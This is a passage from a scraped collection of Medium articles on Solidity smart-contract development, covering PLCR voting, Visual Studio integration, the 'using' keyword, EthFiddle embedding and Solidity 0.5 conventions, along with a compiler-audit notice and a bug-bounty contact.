uses\u200a\u2014\u200aamong other things\u200a\u2014\u200athe fact that due to the way the EVM is built, the contract cannot call itself at the point of its construction. A warning about the most common case has been added some months ago and the static analyzer in remix already warns about that for even longer.Get in\u00a0TouchIf you found a bug in the code generation part of Solidity, please report it to the Ethereum Foundation\u2019s bug bounty program. Please avoid prior public disclosure in order to be eligible for a reward.For not so serious issues, please open an issue in our issue tracker or talk to us on gitter.im/ethereum/solidity-dev.If you want to implement security measures, please also either talk to us or (for smaller things) just open a pull request. If you want to make a long-term commitment to developing Solidity and would like to be paid for that, please consider applying for a job at solidity-jobs@ethereum.org.", "responses": "1"}, {"title": "Solidity Compiler Audit\u00a0Report", "author_name": "Augur", "link": "https://medium.com/@AugurProject/solidity-compiler-audit-report-1832cedb50a8?source=search_post", "post_date": "Dec 11, 2017", "readtime": "3 min read", "upvotes": "470", "content": "Solidity Compiler Audit\u00a0ReportAugurBlockedUnblockFollowFollowingDec 11, 2017In September 2017, Augur engaged Coinspect to perform a security audit of the Solidity Compiler. The objective of the audit was to evaluate the security of the compiler. Sergio Lerner lead the audit, and has delivered a thorough report of the codebase.The full report can be found here, and summary of the audit and issues can be found next.", "responses": "1"}, {"title": "Dev Diary I: A Walkthrough of PLCR Voting in\u00a0Solidity", "author_name": "adChain", "link": "https://medium.com/metax-publication/a-walkthrough-of-plcr-voting-in-solidity-92420bd5b87c?source=search_post", "post_date": "Sep 5, 2017", "readtime": "10 min read", "upvotes": "695", "content": "Dev Diary I: A Walkthrough of PLCR Voting in\u00a0SolidityadChainBlockedUnblockFollowFollowingSep 5, 2017This is the first entry in a series of regular dev diaries members of the adChain Registry dev team will be publishing over the coming months. This first entry is about the adChain Registry\u2019s partial-lock commit/reveal voting system, and was written by Mike Goldin of ConsenSys.Voting on whether to admit domains to the adChain Registry is the heart of adChain\u2019s incentive game. To support this we have developed and open-sourced a generic, Apache-2 licensed implementation of partial-lock commit/reveal (PLCR) voting, written in Solidity. PLCR voting is an efficient system for token-weighted voting which enables a user to participate in multiple polls simultaneously with their tokens while preventing the double-voting of tokens within polls. Importantly, it allows users to withdraw at any time the maximum number of tokens not being actively used for voting.PLCR voting was originally described in a blog post by Aron Fischer writing for the Colony project. Elena Dimitrova\u2019s blog posts on the topic were referenced heavily in building this implementation. We are grateful to them for their original work!Why PLCR Voting?Implementing PLCR voting in Solidity is not trivial, so why bother? In addition to obscuring vote tallies prior to poll completion using commit/reveal (which is desirable to prevent the voting process itself from influencing vote results) PLCR voting enables two things:It enables a user to participate in multiple polls simultaneously while preventing the double-voting of tokens within polls.It allows users to withdraw at any time the maximum number of tokens not being actively used for voting.As an illustration: a user loads 10 tokens into the PLCR Voting contract. The user then commits 10 tokens in poll A and six tokens in poll B. After revealing in poll A, six tokens remain locked in poll B but the user can withdraw four tokens.In a naive non-PLCR polling system, a user might lock tokens in a smart contract describing a single poll. This is not an ideal solution because it prevents the user from participating in multiple polls simultaneously with the same tokens. If the user\u2019s tokens are locked in some smart contract, another smart contract cannot `transferFrom` the user to lock them itself.Remediating this and using one smart contract to manage multiple polls need not be super complex if the contract can lock all user tokens while the user has tokens committed in any polls. However, if the user has approved such a contract to lock 10 tokens and less than 10 are actually committed to polls at any point, the user has to wait for all the polls to conclude before withdrawing any of their tokens. This could actually discourage users from participating in voting, as it ties their hands should they have tokens committed to polls while market events are occurring they might like to respond to. Polling systems should maximize token liquidity to the extent possible.Maximizing token liquidity as such requires the developer take on a fair bit of complexity, at least in Solidity. Using MiniMe tokens is one approach. PLCR voting supports tokens which are not MiniMe tokens.PLCRVoting.solA deployed instance of PLCRVoting.sol specifies a token for which voting rights may be apportioned. Any token-weighted votes needing to be made using that token can be made using the same deployed PLCR voting contract, and these polls will not interfere with one another. The token to be used is specified as the only argument to the constructor.Creating a pollThe startPoll function is used for creating new polls. It takes three arguments and returns a uint. The arguments are:voteQuorum: the necessary percentage of votes \u201cfor\u201d necessary for a poll to be considered passing. Some poll topics may require a supermajority to pass, for example.commitDuration: the duration of the commit period, in seconds.revealDuration: the duration of the reveal period, in seconds.In the function body, the first thing we do is increment the contract\u2019s pollNonce, a storage variable. By incrementing it every time a poll is started, we create a unique ID for each poll. Because we always increment the pollNonce first, note that there will never be a poll with ID zero.Next we instantiate a Poll struct and add it to the pollMap using the pollNonce as the key. The Poll struct stores the poll parameters which were passed in as arguments and initializes counts of votes for and against to zero.Finally we fire a PollCreated event with the pollNonce, and return the pollNonce to be used later as this poll\u2019s pollID. Pretty simple!The next logical thing which might happen after a poll is created, is that someone might like to vote in that poll. There are a few steps to this process, which begin with requestVotingRights.Requesting voting rightsTo prevent tokens double-voting within a poll, the PLCR contract needs to manage user tokens from the time they are committed to when they are revealed. Managed tokens can be used to vote in multiple polls concurrently, but not multiple times in the same poll. requestVotingRights function bestows voting rights to the user equal to the weight of the tokens put under management.In the first line of the function body we check that the actual token balance of the message sender is sufficient relative to the numTokens argument provided. The following line calls transferFrom, moving numTokens from the balance of the message sender to the balance of the PLCR contract. The first line is a redundant check: the second require statement would throw an error in any case where the first did. This is just defensive programming, since people may use this contract with buggy ERC-20 implementations (though there is no excuse for doing so when good implementations exist).Notice also that transferFrom will fail if the user did not approve the PLCR contract to transfer numTokens prior to calling requestVotingRights. This is sad and there are proposals to improve upon the \u201capprove and call\u201d pattern, but they are not yet widely implemented.Finally, if the first two lines succeed, we increment the voteTokenBalance of the message sender by numTokens. Whew. We can vote now. We could also withdraw everything now, as none of the tokens managed have yet been locked in a poll.Committing a voteCommit-reveal is a pattern used in ENS to conceal bids, and can be used for secret balloting as well. A committed vote is a salted hash of the user\u2019s vote, meaning the user\u2019s preference (yes or no) is concatenated with some randomness (the salt) before being hashed and committed. commitVote takes the following arguments:pollID: The ID of the poll being voted in (originally returned in some invocation of startPoll)secretHash: The keccak256 hash of the voter\u2019s choice and salt (tightly packed and in-order)numTokens: the number of tokens to commit to the poll for this voteprevPollID: the ID of the poll for which the user currently has the greatest number of tokens less than or equal to numTokens committed (we\u2019ll talk about this one later).Okay, lets look at the function body. The first thing we\u2019re going to do are a few checks. We\u2019ll call a helper function to make sure the commit period for the provided pollID is active, that the voteTokenBalance of the message sender is at least the numTokens value passed in, and that the provided pollID is not zero.Digression: why do we treat the poll for pollID zero specially? We noted earlier that in startPoll there will never be a pollID for pollNonce zero, and here we specifically check that votes are not being committed to the poll at pollID zero. In the EVM, all data is initialized to zero. If you declare a uint x and don\u2019t initialize it, (x == 0 && x == false) will be true. For smart contracts that interface with the PLCR voting contract, it may be useful to reference the poll at ID zero as a sort of null value. In the adChain Registry, for example, pollIDs are stored with listings which have been challenged. By default these will be initialized to zero. It is efficient if we can know that a listing with pollID zero has no active challenge rather than having to store a separate boolean. For this reason we want to keep the poll at index 0 unused.Okay, so we finished our checks. Now we\u2019re going to do something funky and introduce our doubly linked list.The Doubly Linked-ListThe PLCRVoting contract uses doubly-linked lists to keep track of which polls users have tokens committed in. Implementing a doubly-linked list is a freshman year homework assignment for computer science majors, but implementing one in Solidity is rather more challenging than doing so in, say, Python, because Solidity is such a low-level language. The doubly-linked list is what lets us efficiently release the maximum number of tokens possible to users who wish to withdraw their voting rights and have tokens committed in multiple polls less than the total tokens they have voting rights for.First, a meditation on a core concept: mappings can be used to address memory directly in Solidity, like pointers in C. This is the key to building complex data structures in Solidity.In PLCR voting there is one doubly-linked list per user, addressed using the msg.sender address of the user. A node in a user DLL corresponds to a pollID. The DLLs are always sorted by the number of tokens committed by the user for the polls corresponding to the nodes. Data is stored separately from the nodes themselves and is addressed using the hashed concatenation of a user address and a node ID to index into a string-keyed mapping of integers called an AttributeStore.To clarify: a user address addresses a specific DLL. A nodeID addresses a specific node in a DLL, but because nodeIDs correspond to pollIDs, multiple DLLs can have nodes with identical nodeIDs. By concatenating a user address with a nodeID and hashing, we get a unique location in memory where we can look to find data. The reason we store the data separately from the nodes is so we only need to store one mapping for all nodes, as opposed to one mapping per node. The declaration of a mapping, even if the mapping is empty, uses storage.That\u2019s the basic overview of how the DLL works. Lets get back to how commitVote works and see how we use the DLL in practice.Committing a vote, continuedOn line 102 we set a uint called nextPollID to the result of a method getNext, which is a method of msg.sender\u2019s DLL, that takes an argument prevPollID. prevPollID is the ID of the node which will be the previous node of the new node we are inserting. nextPollID then will be the next node of the new node we are inserting, since it\u2019ll go after prevPollID and therefore before nextPollID.Why do we make the user provide the prevPollID value? We could search through the list to find the correct prevPollID, but in very long lists we might bust the gas limit doing so. Better to let the user do that off-chain in a call and then provide it so the transaction can run in constant time.Line 104 checks, in constant time, whether the provided prevPollID was valid given the number of tokens being committed in the new poll. It should not be possible for the list to become unsorted. If the check passes, on line 105 we insert the new node!We\u2019ve inserted a node, but notice we haven\u2019t actually added the data yet. On line 107 we\u2019ll use a helper function attrUUID to create a new universally unique ID which is the sha3 hash of the user address and the nodeID. Finally we store the number of tokens committed for the poll and the secretHash of our vote.Wow, that was hard!Revealing a voteNow that we know how committing works, revealing will actually be relatively easy. We\u2019ve learned all the hard stuff at this point, so let\u2019s take a gander at revealVote! revealVote takes three arguments:pollID: the pollID of the poll being revealed for.voteOption: the user\u2019s choice in the poll. 1 is a vote for, 0 is a vote against.salt: the random number concatenated to voteOption to produce the secretHash from commitVote.You\u2019ve been around the block at this point, so you know what we\u2019ll do first: checks. We\u2019ll check that the reveal period for the provided pollID is active, that the user has not already revealed for this poll, and we\u2019ll make sure the provided vote option and salt actually match the secretHash which was committed by computing the sha3 hash of the two items and comparing the result to the secretHash stored in the user\u2019s DLL.On line 140 we\u2019ll get the number of tokens the user committed for this poll. Then depending on what the user\u2019s choice in the poll was, we\u2019ll update the poll\u2019s global votesFor or votesAgainst tally.Finally on line 147 we\u2019ll remove the node for this poll in the user\u2019s DLL.Wow, that was easy!Who won?Okay, so a poll\u2019s reveal period has concluded and we want to know how it went. This one\u2019s pretty simple. The isPassed function takes a pollID as an argument and returns true if the number of votes for satisfied the quorum requirement relative to the votes against. In a tie the poll is not passed. Note that the quorum requirement is not a quorum of total tokens which must vote, it is only a quorum of the tokens which did vote.Taking our tokens outThis is the part we\u2019ve worked so hard for. Lets say we have voting rights for 10 tokens, but only seven of them are currently committed in polls. Using withdrawVotingRights we should be able to get three out. withdrawVotingRights takes as an argument the number of tokens we wish to withdraw.The magic happens on line 69. We calculate the tokens available to withdraw by subtracting from the user\u2019s voteTokenBalance the result of a helper function getLockedTokens taking the user address as an argument. This wraps another helper function getNumTokens which takes as arguments our user address and result of yet another helper function getLastNode.Now think about this: our DLL is always sorted by the number of tokens committed to a poll. getLastNode indexes to node zero (the root node) for the DLL of the user and gets the previous node, which should be the poll for which the user has the greatest number of tokens locked. Just by subtracting that number from the total number of tokens the user has loaded in the PLCR contract, we know how many they can withdraw.All of the hard work we did with the DLL, we did for that.Back in withdrawVotingRights, it\u2019s all bookkeeping: we send the tokens back to the user and decrement their voteTokenBalance.And that\u2019s it!Hopefully this walkthrough has been helpful for your understanding of how our PLCR voting contract works! Feel free to use it yourself for all your token-voting needs!Massive props to ConsenSys 2017 interns Yorke Rhodes, Cem Ozer and Aspyn Palatnick for working so hard this summer to make the PLCR voting dream a reality.", "responses": "1"}, {"title": "Solidity Integration with Visual\u00a0Studio", "author_name": "ConsenSys", "link": "https://medium.com/@ConsenSys/solidity-integration-with-visual-studio-8bdab2ff8a74?source=search_post", "post_date": "Apr 1, 2016", "readtime": "6 min read", "upvotes": "118", "content": "Solidity Integration with Visual\u00a0StudioConsenSysBlockedUnblockFollowFollowingApr 1, 2016Cale Teeter, Senior Software Engineer, DX, MicrosoftGetting Started with\u00a0SolidityYesterday we were proud to announce the integration of Solidity and the Smart Contracts that work with Ethereum blockchains into Visual Studio. This exists as an extension that is available here. This extension was designed to lower the bar to working with blockchains and make this a seemless process from inside the world class IDE.The extension is free, and we have put together some steps to further help you get started using this.PrerequisitesTo get started you will need to be using Visual Studio 2015 Community, Professional, or Enterprise edition. You will also need to download the Solidity extension from the Visual Studio Marketplace. You can download that here. After installing the extension, you will need to restart Visual Studio. Also, nodejs will need to be installed to allow local deployments for development. This can be downloaded here. (download the latest LTS version)Create your first Decentralized ApplicationAfter the extension has been installed, next you can create a decentralized application that will be used to author, compile and deploy smart contracts.From the File menu, click new Project.2. In the New Project dialog box, click on Solidity under Installed Templates, and then select DecentralizedApplication. Name the application, MyDecentralizedApp, and then click OK.3. Next you will see a few things happened. A README document was opened in the Visual Studio main window and the project was setup with some folder and sample files. The README explains how to setup a local keyserver in order to deploy smart contracts to a development blockchain instance.a. First download and install the latest version of bloc from Consensys. To do this, open a cmd prompt, navigate to a directly where you would like to install the keyserver and run the following command: npm install blockapps-blocb. Next create the instance of bloc from the core by running the command: bloc init. This will prompt you for some values that will be used the instance. Enter a name of your choice, and user name, and accept the default for the apiUrl. This is the ethereum node that will hold the actual blocks that your account/contracts will be deployed to.c. Now change to that directory and install the required node packages by running the following command: cd <appname> && npm installd. Finally you are ready to start the bloc instance by running the following command: bloc start4. Now we have a keyserver running. This local keyserver will run on port 8000 by default. The Visual Studio extension is configured to use this server by default, with a user named: testuser and a password: testing. You can view and edit these changes by running the following:a. Right click the project in solution explorer.b. The dialog here shows the configuration values that are set by default, and can be adjusted if needed. (they will not need to be adjusted in most cases)5. At this point we have a keyserver running locally, now we have an endpoint that we can deploy our smart contracts to (as well as create new users). So now we can get started with development of smart contracts.Working with Smart Contracts (authoring, compiling, deploying)Now that the foundation is place, we can take a look at working with Smart Contracts. By default a folder named samples will be created with some sample contracts already included. When you are just getting started with Solidity, these are a great source of reference.To get started, we can use the Payout.sol smart contract. First, we can examine the contract in the Visual Studio code window. When we are satisified with what we have authored, we can then compile this contract. This compiliation will take place on the local machine. The output from the compliation will be in the output window of Visual Studio,Compilation1. Compile the smart contract2. The output for the compilation is found in the output window. If you don\u2019t see the output window in the lower part of your screen you can open from the View -> Output menu (or Ctrl + W, O). If there any errors with the compilation, it will be shown in the output window as well.DeploymentThe deployment is nearly as simple as the compilation. The deployment will send the smart contract to your local keyserver which will communicate with the underlying blockchain. What is actually happening is this.1. First, VS will use the project properties (shown earlier) to determine the bloc server to communicate with (url).2. Next VS will call this server, asking if the user in the project properties, exists.a. If it does exist, the address of the user will be returned to Visual Studio.b. If it doesn\u2019t exist, a new user will be created, and that address will be returned to Visual Studio.3. Next, VS will get the source for the contract, along with the address of the user and post this to the bloc server.4. Finally, your default browser will be opened to a dynamically created html page of the smart contract that was deployed.5. When the browser opens, you can enter the password for the bloc server (default is testing).6. You can then exercise the contract. For example, you can send in a value in Ether by post 1 to the setup box.Next StepsAt this point, congratulations, you have now entered the blockchain universe! I will be posting some more tutorials to expand on this.", "responses": "14"}, {"title": "Solidity\u2019s \u2018using\u2019\u00a0keyword", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://medium.com/coinmonks/soliditys-using-keyword-c05c18aaa088?source=search_post", "post_date": "Aug 22, 2017", "readtime": "2 min read", "upvotes": "311", "content": "Solidity\u2019s \u2018using\u2019\u00a0keywordGustavo (Gus) GuimaraesBlockedUnblockFollowFollowingAug 22, 2017There comes a time when one wonders the meaning behind certain features in the programming language one enjoys coding with. Lukas Cremer, Gerard and I are blockchain developers based in Berlin, Germany, and we challenged ourselves whether we could explain the use of solidity\u2019s using keyword.using is used for including a library within a contract in solidity. Check this following example:pragma solidity ^0.4.15;library SomeLibrary  { function add(uint self, uint b) returns (uint) {   return self+b; }}contract SomeContract {        using SomeLibrary for uint;        function add3(uint number) returns (uint) {        return number.add(3);        }}The code using SomeLibrary for uint; allows us in this example to use return number.add(3); inside the function add3\u00a0. It is basically syntactic sugar for the following:pragma solidity ^0.4.15;library SomeLibrary  {function add(uint self, uint b) returns (uint) {   return self+b; }}contract SomeContract {        function add3(uint number) returns (uint) {        return SomeLibrary.add(number, 3);        }}As we can see, by adding the keyword using we could give any uint within the SomeContract the libraries functions and pass the uintas the first parameter of that function.Now let\u2019s look at another example:pragma solidity ^0.4.15;library SomeOtherLibrary  {   function add(uint self, uint b) returns (uint) {     return self+b;   }   function checkCondition(bool value) returns (bool)  {      return value;   }}contract SomeContract {    using SomeOtherLibrary for *;function add3(uint number) returns (uint) {        return number.add(3);        }        function checkForTruthy(bool checker) returns (bool) {        return checker.checkCondition();        }}Here the * allows for any type from the SomeOtherLibrary to be accessed in the contract.Another thing we realized is that this also works for array and struct types but one needs to declare the storage keyword. But this is a topic for another blog post.Thanks to Lukas Cremer and Gerard Baecker for helping with this blog post.", "responses": "2"}, {"title": "How to Embed Solidity Code Snippets in Your Website / Blog (Using EthFiddle)", "author_name": "Georgios Konstantopoulos", "link": "https://medium.com/loom-network/how-to-embed-solidity-code-snippets-in-your-website-blog-using-ethfiddle-980f79649c15?source=search_post", "post_date": "Jan 3, 2018", "readtime": "3 min read", "upvotes": "361", "content": "How to Embed Solidity Code Snippets in Your Website / Blog (Using EthFiddle)Georgios KonstantopoulosBlockedUnblockFollowFollowingJan 3, 2018Up until now, there hasn\u2019t been an easy way to embed your Ethereum Solidity code snippets into posts on your blog or website. Most blog posts I have seen have been using github gists with Javascript code highlighting.Last week, we added oEmbed functionality to EthFiddle. That means you can now easily add syntax-highlighted Solidity snippets in your blog posts that are nicely styled, while also providing a fast way to compile and test the Smart Contract in your browser.How?The straightforward wayWordpress / Medium /\u00a0BloggerIf you are using a platform that supports oEmbed such as Medium or Wordpress, you do not have to do any complex work. Just paste your EthFiddle link and the platform will do the heavy lifting for you!The below fiddle renders by just pasting its link and pressing enter.https://ethfiddle.com/2Rx8cQdEx3Other PlatformsEthfiddle also works with embed.ly! Navigate to this link and input your ethfiddle URL. At the bottom of the page it returns a code snippet that you can use to embed your fiddle!<blockquote class=\u201dembedly-card\u201d><h4><a href=\u201dhttps://ethfiddle.com/2Rx8cQdEx3\">2Rx8cQdEx3</a></h4><p>1 Solidity code sharing site. Share Solidity code snippets with friends, or check out cool code snippets from around the web.</p></blockquote><script async src=\u201d//cdn.embedly.com/widgets/platform.js\u201d charset=\u201dUTF-8\"></script>Note: Embed.ly is a paid service and costs $9 / mo.The hard\u00a0wayWhat do you do when you are building your own custom website and you don\u2019t want to use embed.ly?You can get an embed code from EthFiddle by crafting a special URL that looks like this and doing a GET request:$ curl https://ethfiddle.com/services/oembed?url=ethfiddle.com/2Rx8cQdEx3&format=jsonThe server responds with (formatted with http://jsonprettyprint.com/):{  \"type\": \"rich\",  \"version\": 1,  \"title\": \"2Rx8cQdEx3\",  \"provider_name\": \"Ethfiddle\",  \"provider_url\": \"https://ethfiddle.com\",  \"cache_age\": 86400,  \"html\": \"<iframe id=\"ef_2Rx8cQdEx3\" src=\"https://ethfiddle.com/services/iframesnippet/2Rx8cQdEx3\" scrolling=\"no\" frameborder=\"0\" height=\"300\" width=\"300\" allowtransparency=\"true\" class=\"ef_embed_iframe\" style=\"width: 100%; overflow: hidden;\"></iframe>\",  \"width\": \"300\",  \"height\": \"300\"}Note the html key. You can copy the iframe code and add it to your website. Of course you can modify the CSS in order to fit your style.In this example you would add the following to your site:<iframe src=\"https://ethfiddle.com/services/iframesnippet/2Rx8cQdEx3\" scrolling=\"no\" frameborder=\"0\" height=\"300\" width=\"300\" allowtransparency=\"true\" class=\"ef_embed_iframe\" style=\"width: 100%; overflow: hidden;\"></iframe>ConclusionAnd that\u2019s it! Now you can easily embed Solidity code snippets on all your sites and blog posts.If you\u2019re learning Solidity or building Ethereum DApps, you may be interested in our interactive Solidity code academy or our scalable sidechains for Ethereum DApps.Join our mailing list below to get regular updates:", "responses": ""}, {"title": "Writing Smart Contracts with Solidity 0.5 and\u00a0Above", "author_name": "Ross Bulat", "link": "https://medium.com/block-journal/writing-solidity-0-5-smart-contracts-101-5efd1ee9f53e?source=search_post", "post_date": "Feb 2", "readtime": "12 min read", "upvotes": "345", "content": "Writing Smart Contracts with Solidity 0.5 and\u00a0AboveA walkthrough to start writing Ethereum smart contracts with Solidity 0.5 and\u00a0aboveRoss BulatBlockedUnblockFollowFollowingFeb 2=Start writing smart contracts with Solidity >\u00a00.5This article acts as an on-boarding tool for you to start writing smart contracts with Solidity. By using standard tools and conventions that the developer community have been evolving since the language\u2019s inception, we will visit the recent changes to Solidity and how to ensure your smart contracts are error free.The official Solidity documentation has fallen behind the times slightly, at least at the time of this writing\u200a\u2014\u200athe examples are still showcasing Solidity 0.4 (the current version introduces a collection of new features and breaking changes from the previous version) with out of date and somewhat uninspiring example contracts. I find Truffle Boxes a more inspiring resource to browse through.What we will cover here: IDEs & tools, importing and compiling contracts, breaking changes and conventions.In this article we will firstly overview the IDEs at your disposal to be developing Solidity smart contracts, before visiting important concepts to adhere to when writing Solidity contracts, and how to ensure we utilise them correctly. We\u2019ll also visit the structure of a smart contract and popular conventions used when writing them.If you would like to contribute to Solidity, documentation is one of the most requested aspects to be contributing to at this time. Although contributing to the language is an entirely different talk, check out the Solidity Contributing page if you\u2019d like more information on the subject.With that, let\u2019s start familiarising ourselves with Solidity 0.5 and suitable software for developing with it\u200a\u2014\u200ayou will most likely be able to integrate Solidity development into your favourite IDE.Prerequisite: Setting up your workspaceThere are a couple of notable browser-based IDEs that you can utilise to develop Solidity smart contracts in the event that you do not use a dedicated IDE: Along with the Remix online IDE recommended in the Solidity docs, we also have ETHFiddle (Similar to JSFiddle) that allows you to run contracts online and share them throughout your network.IDE Solidity\u00a0SupportI personally prefer installing support for Solidity in my favourite dedicated IDE, opting for Sublime Text over other offerings. Let\u2019s briefly visit some of the packages available for your IDE:Sublime Text: The Ethereum package is available for Sublime Text, as well as a linting package named SoliumLinter. SoliumLinter is used to analyse your Solidity code and check for errors within the Sublime Text IDE.Visual Studio: A Solidity package is available on the Visual Studio Marketplace, enabling Solidity smart contract development in the VS IDE.Atom: The language-ethereum package is available for Atom bringing syntax highlighting and snippets to Solidity and Serpent files in Atom.Emac: Enable Emac Solidity mode.Vim: Enable Solidity syntax with vim.Install the relevant package for you and fire up a new project.The next tool we will visit is Truffle. The Truffle Suite is a set of tools designed to aid in the entire Ethereum Dapp development process\u200a\u2014\u200abut Truffle itself is very good at aiding in the development of Solidity Smart Contracts\u200a\u2014\u200athis is what we will focus on in more detail here.To get up to speed with Truffle and to save repetition, check out my introductory article on the suite:Introduction to the Truffle Suite and Dapp Development PipelineBreaking down the Ethereum Dapp Development pipeline using Truffle, Ganache and Drizzlemedium.comUpdate to the latest Truffle and Solidity\u00a0versionsIt is worth mentioning the importance of keeping Truffle and the underlying Solidity compiler up to date. Run the following commands to install the latest versions of Truffle and solc (Solidity compiler) packages:npm install -g truffle@latestnpm install solc@latestTake note of the latest version of the Solidity compiler in-particularly to guarantee your smart contracts will adhere to the latest Solidity standards. They change quite frequently!Exploring & Importing Solidity\u00a0ProjectsAt this point you may wish to import some ready-made smart contracts into a Truffle project. Let\u2019s briefly do this now to get a feel for what completed contracts consist of, as well as familiarising ourselves with the import process.MetaCoin\u200a\u2014\u200aBasic Truffle\u00a0ProjectA bare-bones project we can use for familiarisation purposes is the MetaCoin project, provided as a Truffle box. Import the project in a new folder by unboxing MetaCoin with the following commands:mkdir metacoincd metacointruffle unbox metacoinThis bootstraps a Truffle project with the contracts/MetaCoin.sol contract. Not only is this contract written with Solidity 0.4, it is also incomplete and does not adhere to the ERC20 standard; not very useful.However, the contracts are valid syntax and will indeed compile. Run truffle compile now to observe a successful deployment.Take a peak at the MetaCoin.sol file and see if you understand what is happening. We will visit this syntax later on in the article in relation to Solidity 0.5.ERC721 Standard by\u00a00xcertNext, let\u2019s briefly visit a completed production-ready token, by importing the ERC721 standard into our project. Check out the contracts here on Github or the project homepage here.About the ERC721 standard:ERC721 contracts adhere to a standard for Non-Fungible tokens. Every token is unique and could have a different value. Use cases include collectables apps such as Crypto Kitties and similar offerings, whereby every Kitten is represented by a unique token ID.Within the /src/contracts/tokens folder there is a basic NFToken offering as well as two extended contracts; one for additional MetaData, and one for Enumeration. Contracts starting with erc721- contain function signatures required to adhere to the standard, whereas contracts starting with nf-token- are the actual implementations.These contracts also import utilities from the utils/ and math/ folder one level up. Let\u2019s import the entire contracts/ folder into our Truffle project.Clone the entire project outside of your local metacoin/ folder and copy the contracts into its contracts/ folder:#clone ERC721 project and copy contracts into metacoincd ..git clone https://github.com/0xcert/ethereum-erc721.gitcp -R ethereum-erc721/src/contracts/* metacoin/contractsIn order to migrate these contracts we will need to add a new migrations file. Add a 3_deploy_nftoken.js file within metacoin/migrations/, importing the MetaData NFToken contract for deployment:#metacoin/migrations/3_deploy_nftoken.jsvar Migrations = artifacts.require(\"Migrations\");var NFTokenMetaData = artifacts.require(\"nf-token-metadata\");module.exports = function(deployer) {  deployer.deploy(Migrations);  deployer.deploy(NFTokenMetaData);};And finally hop back into metacoin/ and migrate them:# migrate the contracts within metacoincd metacointruffle migrateExcellent, we already have some Solidity management workflow under our belt.Let\u2019s next talk about some underlying Solidity 0.5 conventions.Common Errors and Underlying Solidity\u00a0ConceptsRunning various Truffle commands allows us to test our smart contracts in real time: truffle compile, truffle test or truffle migrate will all summon the Solidity compiler to compile the latest version of your Solidity contracts.By utilising these features we can test the validity of our Smart Contracts and iron out bugs before they are deployed on our test blockchain, whether it be Ganache or any other client.Now, if an error is found in your contracts, useful output is provided to us by the Solidity compiler, as well as suggestions on how to fix that error. Let\u2019s explore some Solidity errors you may encounter, and talk about the underlying concepts of Solidity we need to adhere to in order to prevent such errors.These errors may range from any of the following:Forgetting to define a function as internal or external.internal functions can only be called within the contract they are defined in (as well as by internal library functions and inherited functions). external functions can be accessed by other smart contracts and via web3 calls, and consist of their own signature and address.Forgetting to define a function type as view, pure or\u00a0payable.Functions need a type to determine their scope and capabilities in terms of what contract state they have access to, and what they can manipulate.A function is of type view if no contract state is changed within that function. In other words, it cannot alter the behaviour of future interactions with any contract. They can only call other view or pure functions.A function of type pure is even more restrictive; pure functions can only depend on the arguments passed into them. Like view, they cannot utilise the msg object, send or receive ETH, or refer to the block object.payable functions have the ability to accept ETH payments, and this could also be a payment of 0 ETH. Providing an ETH amount of 0 will still be valid, the point here is that the function will accept this value and be able to process it.Forgetting to provide a reference type to function arguments or function variables, as memory, callable or\u00a0storage.This is a requirement as of Solidity 0.5.These are called reference types, and arrays and structs now need a reference type applied to them. A reference type is simply a reference to the data location of where the value is stored.Arguments of external functions will be referenced as calldata. An variable referenced as memory will indeed to stored in memory, making it temporary. A variable referenced as storage will be stored permanently. In practicality, function arguments are general memory whereas contract state variables and local variables are storage.We now begin to realise the importance of a reliable compiler with reliable error reporting. Truffle will provide us with this, letting us know where we have assigned the incorrect reference type, and which one to correctly use.Not returning the correct type from a\u00a0functionWithin Solidity we can either define a type of value (or tuple, or Struct) to be returned from a function, or the type followed by a variable. For example:function ownerOf(uint256 _tokenId)    external    view    returns (address _owner)  {    _owner = idToOwner[_tokenId];    require(_owner != address(0));  }In the above function we define the _owner return variable and simply write a value to it within the function block. No return statemement is needed.We could rewrite this function to just define the return type and include a return statement:function ownerOf(uint256 _tokenId)    external    view    returns (address)  {    address _owner = idToOwner[_tokenId];    require(_owner != address(0));    return _owner;  }Both cases are valid, and ultimately is the developers decision on which to use.Overlooking illogical syntaxOnce we have carefully designed our smart contract along with our function signatures, we then need to be sure that the logic inside them do indeed adhere to the function\u2019s type. For example, we do not want to attempt sending a transaction from within a view function.Luckily, attempting to compile contracts will fail if these errors exist. The Solidity compiler will always pick up type errors.Giving functions too much\u00a0scopeConversely, giving a function too much capability that it does not use will flag a warning. If a function is typed as payable but only adheres to a pure function, then the Solidity compiler will let us know and suggest the more suitable type.Attempting things that Solidity does not support\u00a0yetIf we attempt to return a type that is not supported within Solidity at this time, the compiler will fail and make it clear why. For example, trying to return an array from a function is not supported.Conversely, if Solidity does support such a feature, but such feature is part of an experimental feature set that you specifically have to define, the compiler will also let us know, and provide the line of code to be included at the top of your contract\u200a\u2014\u200amost likely a pragma statement.An example of this is constructing an array of a Struct type within a for loop.General syntax\u00a0errorsOf course, general syntax errors like spelling errors or missing semi-colons will be flagged, line number and code.The Structure of a Solidity Smart\u00a0ContractHow can we minimise the probability of introducing errors in our smart contracts beyond a distraction-free environment and a high dosage of coffee? By making sure our contracts are organised and adhere to some sort of structure.The high level structure of a smart contract in Solidity, with some example code, is as follows://Solidity versionpragma solidity 0.5.3;The version of Solidity being used is always a requirement.//importsimport \"./ERC721.sol\";import \"./utils/supports-interface.sol\";import \"./utils/address-utils.sol\";...Imports of other contracts. These may be utility or helper functions, for example, signatures for all the functions that adhere to the ERC721 standard.//Contract Variablesaddress internal owner;mapping (uint256 => address) internal idToOwner;uint256 internal totalTokensMinted;...Contract variables are defined next, storing contract state. These can range from public addresses of other accounts, key value indexes with the mapping type, and primitive types like unsigned integers. All the contract variables above are internal, meaning only contract functions can read and write to them, however this is not a requirement.//Eventsevent TokenCreated(    address indexed tokenAddress,    string name,    string symbol,    address owner);...Next we define the Events of our contract. Events can be called from within our contract functions for the purpose of registering that something happened within smart contract execution. This event is consequently recorded on the blockchain.This allows external applications or APIs to listen to Events from the blockchain and update their UI or databases accordingly.For example, A React app with web3 installed could listen to a Transfer event of an ERC20 token, and update its UI to reflect the balances of the sender and receiver. Events can represent anything the developer chooses, and are dependant on the design of the contract.//Modifiersmodifier isTokenAvailable(uint256 _tokenId) {    uint256 tokenStatus = idToTokenStatus[_tokenId];    require(        tokenStatus == 1,         \"Token is not available to transfer\");    _;}...function transferFrom(    address _from,    address _to,    uint256 _tokenId  )    external    isAvailable(_tokenId)  {    ...  }Modifiers are extensions of functions that execute before the function it is modifying in order to inject additional functionality, mostly in the form of checks and requirements of function arguments and contract state.In the example above we are extending transferFrom() with the isAvailable() modifier to check if a token is available to transfer. Within the modifier we use Solidity\u2019s require() method, which reverts execution upon a condition not being met. It also takes a second argument; a message to return upon a false result.See the underscore and 